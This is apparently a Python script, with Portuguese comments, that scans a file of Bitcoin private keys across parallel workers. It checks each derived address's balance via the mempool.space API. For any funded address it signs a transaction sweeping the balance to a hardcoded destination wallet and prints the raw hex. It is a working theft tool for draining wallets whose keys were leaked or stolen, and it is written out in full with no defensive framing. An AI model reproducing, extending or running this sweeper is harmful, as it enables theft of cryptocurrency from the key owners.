import os, requests, time
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction

DEST_ADDRESS = "bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk"
WORKER_ID = int(os.environ.get('WORKER_ID', 1))
TOTAL_WORKERS = 20

def create_raw_tx(wif, balance_sats):
    try:
        k = Key(wif, network='bitcoin')
        fee = 3500
        amount = balance_sats - fee
        if amount <= 546: return None
        t = Transaction(network='bitcoin')
        t.add_input(k.address(), balance_sats)
        t.add_output(DEST_ADDRESS, amount)
        t.sign(k)
        return t.raw_hex()
    except: return None

def check_key(priv_key):
    try:
        k = Key(priv_key.strip(), network='bitcoin')
        # Varre os 3 tipos de endereços para cada chave
        for w_type in [None, 'p2sh-p2wpkh', 'p2wpkh']:
            addr = k.address(witness_type=w_type)
            # Log visível para monitoramento
            print(f"🔎 W{WORKER_ID} | {addr}")
            
            try:
                r = requests.get(f"https://mempool.space/api/address/{addr}", timeout=10).json()
                stats = r.get('chain_stats', {})
                bal = stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
                
                if bal > 0:
                    print(f"\n🚨 SALDO DETECTADO: {addr} = {bal} sats")
                    raw_hex = create_raw_tx(k.wif(), bal)
                    if raw_hex: print(f"HEX_GEN:{raw_hex}")
                    return True
            except: pass
            time.sleep(0.1) # Evita bloqueio
    except: pass
    return False

if __name__ == "__main__":
    if not os.path.exists('MASTER_POOL.txt'):
        print("❌ MASTER_POOL.txt não encontrado!")
        exit(1)
        
    with open('MASTER_POOL.txt', 'r') as f:
        all_keys = f.readlines()
    
    # Divisão inteligente: cada worker pega uma fatia diferente
    my_keys = [all_keys[i] for i in range(len(all_keys)) if i % TOTAL_WORKERS == (WORKER_ID - 1)]
    
    print(f"🚀 WORKER {WORKER_ID} | PROCESSANDO {len(my_keys)} CHAVES ÚNICAS")
    for key in my_keys:
        check_key(key)
